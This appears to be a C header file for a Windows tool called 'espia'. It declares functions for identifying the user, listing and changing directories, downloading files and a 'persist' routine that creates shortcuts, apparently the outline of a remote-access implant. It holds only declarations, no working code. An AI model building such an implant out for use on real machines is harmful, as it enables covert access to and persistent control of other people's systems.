#pragma once

#include "espia_debug.h"
#include "espia_error.h"

#ifdef _WIN32_WINNT
#undef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif

#include <shlobj.h>
#define INITGUID
#define INITKNOWNFOLDERS
#include <Knownfolders.h>

#include <shlwapi.h>

#ifndef WINDOWS_H
#define WINDOWS_H
#include <windows.h> 
#endif

#include <strsafe.h>
#if DEBUG
#include <stdio.h>
#endif

#include <comdef.h>

void whoami(LPWSTR buffer, INT size_buffer);
void pwd(LPWSTR buffer, INT size_buffer);
void ls(INT (*callback)(PWSTR buffer, INT size_buffer));
INT cd(PWSTR path, PWSTR buffer, INT size_buffer);
INT download_file(PWSTR filename, INT (*input_stream)(PSTR buffer, INT size_buffer), INT (*output_stream)(PWSTR buffer, INT size_buffer));
INT persist();
HRESULT CreateLink(LPCWSTR lpszPathObj, LPCWSTR lpszPathLink, LPCWSTR lpszDesc);